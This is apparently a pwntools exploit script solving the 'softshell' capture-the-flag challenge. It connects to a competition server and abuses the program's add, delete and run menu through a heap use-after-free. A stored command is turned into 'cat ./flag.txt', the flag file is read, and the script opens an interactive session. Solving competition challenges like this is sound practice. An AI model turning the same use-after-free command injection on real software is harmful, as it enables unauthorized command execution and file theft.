#!/usr/bin/python3

from pwn import *

exe = ELF('softshell', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x0000555555555bb7

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chal.pctf.competitivecyber.club', 8888)
else:
        p = process(exe.path)
def add(payload, tag):
        sla(b">> ", b'1')
        sla(b">> ", payload)
        sla(b">> ", tag)
def delete(idx):
        sla(b">> ", b'5')
        sla(b">> ", str(idx).encode())
def run(idx):
        sla(b">> ", b'4')
        sla(b">> ", str(idx).encode())
        
GDB()

payload = b'/usr/games/cowsay moooo'
add(payload, payload)
delete(0)

payload = b'./flag.txt'
add(payload, payload)
delete(0)

payload = b'cat'
add(payload, payload)
# delete(0)
# payload = b'cat'
# add(payload, payload)

run(0)
 

p.interactive()

